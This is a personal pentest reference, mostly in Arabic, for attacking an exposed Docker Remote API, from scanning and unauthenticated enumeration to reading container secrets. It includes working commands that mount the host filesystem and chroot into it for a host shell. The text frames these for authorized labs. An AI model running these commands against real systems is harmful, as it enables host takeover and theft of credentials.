PORT 2375 / 2376 — DOCKER REMOTE API

Docker API — من الفحص إلى ما بعد الاستغلال

Quick Service Reference — مرجع عملي أثناء الـLab لاكتشاف وتعداد واختبار Docker Remote API بشكل مصرح.

✒ Abdullah Nasser Almsan — Personal Pentest Reference
ملاحظة عن البورت: 2375/TCP شائع للاتصال غير المشفر، و2376/TCP شائع مع TLS، لكن كلاهما قابل للتغيير. إذا لم تظهر الخدمة عليهما، استخدم فحص -p- قبل استبعاد Docker Remote API.

1. Reconnaissance

ابدأ بتأكيد شبكتك والوصول للهدف، ثم ابحث عن مؤشرات أن الهدف يشغّل Docker أو خدمات إدارة حاويات.

تحديد الشبكة والمسار

Identify Local Interface KALI TERMINAL
ip a
اعرف عنوان جهازك والواجهة المستخدمة.
Review Network Route KALI TERMINAL
ip route
تأكد من مسار الشبكة والـgateway.

اختبار الوصول واكتشاف الأجهزة

Test Target Reachability KALI TERMINAL
ping -c 4 [TARGET]
عدم الرد لا يعني أن الهدف Down؛ ICMP قد يكون محجوب.
Discover Live Hosts KALI TERMINAL
nmap -sn [SUBNET]
استخدمه داخل Lab لاكتشاف الأجهزة الحية.
2375/TCP غالبًا Docker Remote API بدون TLS، بينما 2376/TCP يُستخدم عادةً مع TLS. لا تعتبر هذا قاعدة مطلقة؛ يمكن تغيير البورتين.

2. Port Scanning

افحص 2375 و2376 أولًا، ثم اعمل Full TCP scan لأن Docker API قد يُنقل إلى بورت مختلف.

الفحص الأساسي

Detect Docker API Service KALI TERMINAL
nmap -Pn -p2375,2376 -sV [TARGET]
ابدأ بتحديد حالة البورتين والخدمة الظاهرة.
GENERAL REFERENCE — النجاح = Nmap يعرّف Docker API أو يؤكد HTTP/TLS على البورت المتوقع.
Fingerprint Docker API Service KALI TERMINAL
nmap -Pn -p2375,2376 -sC -sV [TARGET]
شغّل default scripts مع version detection.

الفحص الشامل

Find Non-Standard Docker Port KALI TERMINAL
nmap -Pn -p- --min-rate 1000 [TARGET]
إذا ما ظهر Docker على البورتات الشائعة، افحص كل TCP ports داخل الـLab.
Confirm Discovered Docker Port KALI TERMINAL
nmap -Pn -p[PORT] -sV -sC [TARGET]
أعد الفحص على البورت الفعلي الذي وجدته.

تأكيد HTTP API

Check Docker API Availability over HTTP KALI TERMINAL
curl -i http://[TARGET]:[PORT]/_ping
إذا كانت API بدون TLS ومتاحة، غالبًا يرجع endpoint بسيط يثبت أن الخدمة تستجيب.
Check Docker API Availability over HTTPS KALI TERMINAL
curl -sk -i https://[TARGET]:[PORT]/_ping
استخدم HTTPS إذا كان البورت يعمل بـTLS.
لا تفترض أن 2376 يعني TLS دائمًا أو أن 2375 يعني No-Auth دائمًا. أكد السلوك فعليًا بالـHTTP/TLS requests.

3. Enumeration

حدد هل الـAPI مكشوفة بدون مصادقة، وما هي نسخة Docker، والحاويات، والصور، والشبكات المتاحة.

معلومات النسخة والنظام

Get Docker Version KALI TERMINAL
curl -s http://[TARGET]:[PORT]/version | jq
يعرض Version وAPI version ومعلومات runtime إذا endpoint متاح.
Get Docker System Information KALI TERMINAL
curl -s http://[TARGET]:[PORT]/info | jq
يعرض معلومات Docker daemon العامة مثل عدد الحاويات والصور والتخزين.

الحاويات والصور

List All Containers KALI TERMINAL
curl -s 'http://[TARGET]:[PORT]/containers/json?all=1' | jq
اعرض جميع الحاويات، وليس الحاويات العاملة فقط.
GENERAL REFERENCE — النجاح = ظهور Containers/resources التي يسمح الـdaemon بعرضها.
List Images KALI TERMINAL
curl -s http://[TARGET]:[PORT]/images/json | jq
اعرض الصور الموجودة محليًا على الهدف.
List Networks KALI TERMINAL
curl -s http://[TARGET]:[PORT]/networks | jq
استخرج Docker networks المتاحة.

تفاصيل حاوية محددة

Inspect Container Configuration KALI TERMINAL
curl -s http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/json | jq
افحص Mounts وEnv وNetworkSettings وConfig للحاوية.
ابحث داخل Env وMounts عن أسرار أو paths حساسة مثل كلمات مرور DB، tokens، bind mounts، أو docker.sock.

Docker CLI بدل curl

Verify Docker CLI API Access KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] version
إذا كان Docker CLI مثبتًا والخدمة بدون TLS، هذا يختبر الاتصال مباشرة.
List Containers with Docker CLI KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] ps -a
اعرض الحاويات من خلال Docker CLI.
List Images with Docker CLI KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] images
اعرض الصور المتاحة على الـdaemon.

TLS Enumeration

Inspect Docker TLS Certificate KALI TERMINAL
openssl s_client -connect [TARGET]:[PORT] -showcerts
افحص الشهادة إذا كانت الخدمة تستخدم TLS.
Test mTLS Version Access KALI TERMINAL
curl --cert [CLIENT_CERT] --key [CLIENT_KEY] --cacert [CA_CERT] https://[TARGET]:[PORT]/version
إذا عندك client certificate مصرح، اختبر mTLS بهذه الطريقة.
قراءة Env أو Mounts قد تكشف أسرارًا حقيقية. داخل Lab فقط، ولا تنسخ بيانات خارج نطاق الاختبار.

4. Credential Testing

Docker Remote API عادةً لا يعتمد username/password مثل SSH. الحماية الشائعة تكون Network ACL أو TLS/mTLS، لذلك لا تستخدم brute-force عشوائي.

تحديد هل الخدمة بدون مصادقة

Check Unauthenticated API Access KALI TERMINAL
curl -i http://[TARGET]:[PORT]/version
إذا رجعت معلومات النسخة مباشرة فهذا مؤشر قوي أن الـAPI متاحة بدون مصادقة على هذا المسار.
GENERAL REFERENCE — إذا رجعت معلومات النسخة بدون credentials فهذا وصول غير موثق للـAPI على هذا المسار.
Confirm Unauthenticated Docker CLI Access KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] info
أكد من Docker CLI أن الـdaemon يقبل أوامرك بدون شهادات.

اختبار mTLS عند توفر الشهادات

Test Authorized mTLS Access KALI TERMINAL
docker --tlsverify --tlscacert=[CA_CERT] --tlscert=[CLIENT_CERT] --tlskey=[CLIENT_KEY] -H tcp://[TARGET]:[PORT] info
اختبر الشهادات المصرح بها بدل محاولات password guessing غير المناسبة.
GENERAL REFERENCE — النجاح = قبول الشهادات وإرجاع معلومات الـdaemon ضمن صلاحياتها.
Verify Client Certificate Access KALI TERMINAL
curl --cert [CLIENT_CERT] --key [CLIENT_KEY] --cacert [CA_CERT] https://[TARGET]:[PORT]/_ping
تحقق من صحة client certificate يدويًا.

البحث عن مفاتيح وشهادات معاد استخدامها

Locate Docker TLS Materials KALI TERMINAL
find [DIR] -type f \( -name '*.pem' -o -name '*.crt' -o -name '*.key' \) 2>/dev/null
داخل ملفات الـLab أو بعد وصول مصرح، ابحث عن مواد TLS التي قد تخص Docker.
Find Docker Client Configuration KALI TERMINAL
grep -RniE 'DOCKER_HOST|DOCKER_TLS_VERIFY|DOCKER_CERT_PATH' [DIR] 2>/dev/null
ابحث عن إعدادات Docker client محفوظة في scripts أو configs.
لا تستخدم Hydra على Docker API. لو الخدمة محمية بـmTLS، المطلوب شهادات صحيحة وليس username/password تقليدي.

5. Exploitation

إذا كانت Docker API مكشوفة بدون مصادقة، فأنت غالبًا تتحكم بالـdaemon. اختبر التأثير تدريجيًا داخل الـLab وابدأ بإثبات منخفض التأثير.

إثبات تحكم منخفض التأثير

Create Test Container and Verify Command Execution KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] run --rm alpine id
يشغّل حاوية مؤقتة ويثبت أن بإمكانك إنشاء workloads عبر الـdaemon.
Verify Test Container Runtime KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] run --rm alpine uname -a
اختبار بسيط إضافي بدون إبقاء حاوية دائمة.

فحص host filesystem exposure بشكل مشروط

Verify Read-Only Host Mount KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] run --rm -v /:/host:ro alpine ls -la /host
اختبر فقط داخل Lab إن كان الـdaemon يسمح bind mount للـhost. استخدم read-only أولًا.
Read Host OS Through Mount KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] run --rm -v /:/host:ro alpine cat /host/etc/os-release
يعطيك معلومات نظام الـhost من mount read-only بدون تعديل الملفات.
الوصول إلى Docker daemon غالبًا يعادل صلاحيات عالية على الـhost. لا تستخدم write mounts أو privileged containers على أي نظام غير مصرح به.

Host access داخل Lab عند الحاجة لإثبات الأثر

Test Host Filesystem Shell Access KALI TERMINAL
docker -H tcp://[TARGET]:[PORT] run --rm -it -v /:/host alpine chroot /host /bin/sh
مسار Lab شائع لإظهار أن التحكم بالـdaemon يمكن أن يتحول إلى shell على الـhost. يعتمد على توفر shell والـfilesystem.
هذا الأمر عالي التأثير لأنه ينقلك فعليًا إلى بيئة ملفات الـhost. استخدمه فقط إذا كان هدف الـLab إثبات host compromise.

Docker API مباشرة بدون Docker CLI

Create Test Container via REST API KALI TERMINAL
curl -s -X POST -H 'Content-Type: application/json' -d '{"Image":"alpine","Cmd":["id"]}' http://[TARGET]:[PORT]/containers/create?name=[NAME] | jq
ينشئ حاوية عبر REST API مباشرة.
Start Test Container via REST API KALI TERMINAL
curl -s -X POST http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/start
شغّل الحاوية التي أنشأتها.
Inspect Test Container Result KALI TERMINAL
curl -s 'http://[TARGET]:[PORT]/containers/[CONTAINER_ID]/logs?stdout=1&stderr=1'
اعرض مخرجات الحاوية.
GENERAL REFERENCE — النجاح = ظهور نتيجة الأمر الذي شُغّل داخل test container؛ احذف/استخدم --rm حيث يغطيه الـworkflow الحالي.
إذا احتجت impact أكبر، اربطه بهدف الـLab فقط. لا تقفز مباشرة إلى privileged أو write mounts بدون سبب.

6. Post-Exploitation

بعد إثبات التحكم، اجمع الحد الأدنى من المعلومات المهمة وحدد هل الوصول داخل container أو فعليًا على الـhost.

تأكيد السياق داخل الحاوية

Verify Current UID/GID VICTIM SHELL
id
حدد UID/GID الحالي.
Verify Current Host VICTIM SHELL
hostname
اعرف hostname الحالي.
Check Container Context VICTIM SHELL
cat /proc/1/cgroup
يساعدك على معرفة هل أنت داخل container حسب البيئة.

إذا وصلت للـhost عبر chroot أو shell مباشر

Verify Host User VICTIM SHELL
whoami
أكد هوية المستخدم على الـhost.
Identify Host OS VICTIM SHELL
cat /etc/os-release
حدد نظام التشغيل وإصداره.
Review Host Network Interfaces VICTIM SHELL
ip a
حدد واجهات الشبكة المتاحة على الـhost.

مراجعة Docker artifacts

List Host Containers VICTIM SHELL
docker ps -a
إذا Docker CLI متوفر على الـhost، اعرض الحاويات.
Inspect Host Container VICTIM SHELL
docker inspect [CONTAINER_ID]
راجع Mounts وEnv وNetworks للحاوية المهمة.
List Docker Networks VICTIM SHELL
docker network ls
اعرض الشبكات الداخلية التي قد تكون مهمة للـpivoting لاحقًا.
بعد تأكيد الوصول، انتقل لملف Linux Post-Exploitation وPivoting العام عندك بدل تكرار كل خطوات ما بعد الاستغلال هنا.
لا تحذف containers أو images ولا توقف workloads حقيقية. في Lab استخدم --rm للحاويات التجريبية متى أمكن.
